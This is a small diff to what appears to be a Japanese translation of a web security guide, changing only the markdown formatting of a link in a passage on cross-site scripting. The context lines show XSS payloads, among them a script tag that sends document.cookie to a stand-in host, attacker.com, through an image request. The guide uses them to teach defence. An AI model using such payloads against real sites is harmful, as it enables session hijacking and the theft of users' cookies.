@@ -722,7 +722,7 @@ XSSをチェックする最も簡単なテストをご紹介します。
 <script>document.write(document.cookie);</script>
 ```
 
-もちろん、攻撃者にしてみれば標的ユーザーが自分で自分のcookieを表示したところで何の意味もありません。次の例では、http://www.attacker.com/というURLから画像とcookieを読み込みます。言うまでもありませんが、このURLは実際には存在しませんので、ブラウザには何も表示されません(訳注: 現在は売り物件のWebページがあるようです)。ただし攻撃者はWebサーバーのアクセスログファイルを調べて標的ユーザーのcookieを参照することができます。
+もちろん、攻撃者にしてみれば標的ユーザーが自分で自分のcookieを表示したところで何の意味もありません。次の例では、[http://www.attacker.com/](http://www.attacker.com/)というURLから画像とcookieを読み込みます。言うまでもありませんが、このURLは実際には存在しませんので、ブラウザには何も表示されません(訳注: 現在は売り物件のWebページがあるようです)。ただし攻撃者はWebサーバーのアクセスログファイルを調べて標的ユーザーのcookieを参照することができます。
 
 ```html
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
